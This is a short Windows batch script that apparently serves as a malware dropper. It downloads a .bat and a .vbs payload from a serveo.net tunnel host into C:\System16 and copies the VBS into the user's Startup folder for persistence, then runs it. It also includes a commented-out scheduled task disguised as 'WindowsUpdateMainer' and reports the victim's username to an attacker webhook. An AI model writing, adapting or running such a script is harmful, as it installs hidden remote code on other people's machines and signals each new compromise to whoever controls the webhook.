@echo off

curl http://your_hostname.serveo.net/scheduled.bat -o C:\System16\scheduled.bat
curl http://your_hostname.serveo.net/scheduled.vbs -o C:\System16\scheduled.vbs

cd C:\System16
Rem schtasks /create /tn "WindowsUpdateMainer" /tr "C:\System16\scheduled.vbs" /sc minute /mo 1
copy scheduled.vbs "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
cscript "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\scheduled.vbs"


SET WEBHOOK_URL=<YOUR WEBHOOK URL>
curl -H "Content-Type: application/json" -d "{\"username\": \"%USERNAME%\", \"content\":\"Setup.bat ran from new computer.\"}" %WEBHOOK_URL%
